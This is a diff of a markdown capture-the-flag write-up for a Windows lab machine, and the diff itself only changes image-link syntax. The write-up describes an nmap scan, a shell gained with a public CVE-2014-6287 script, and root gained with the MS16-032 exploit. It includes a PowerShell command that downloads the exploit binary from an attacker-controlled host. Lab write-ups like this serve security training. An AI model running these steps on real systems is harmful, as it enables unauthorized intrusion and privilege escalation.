@@ -22,27 +22,27 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 ```
 Port 80 timeeee  
-![[1.png]]
+![fuckmsf](1.png)
 Lots of this to check :(  
 When trying to login , and failing we see something interesting :  
-![[2.png]]
+![fuckmsf](2.png)
 hmmm  
-![[3.png]]
+![fuckmsf](3.png)
 Hehe  
 ## User
 We use the https://github.com/roughiz/cve-2014-6287.py (do not forget to run it with sudo )  
 And get a  shell :  
-![[4.png]]
+![fuckmsf](4.png)
 ## Root 
-![[5.png]]
+![fuckmsf](5.png)
 We find the version of the win , search it on the internet and find an exploit :
-![[6.png]]
+![fuckmsf](6.png)
 We will use the compiled version : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032/x64
 ```bash
 wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-032/x64/ms16-032.exe
 ```
 Get the exploit on the other machine 
-![[7.png]]
+![fuckmsf](7.png)
 ```bash
 powershell.exe -c "Invoke-WebRequest -Uri http://10.10.14.7/ms16-032.exe -OutFile C:\Users\kostas\Desktop\ms16-032.exe
 ```
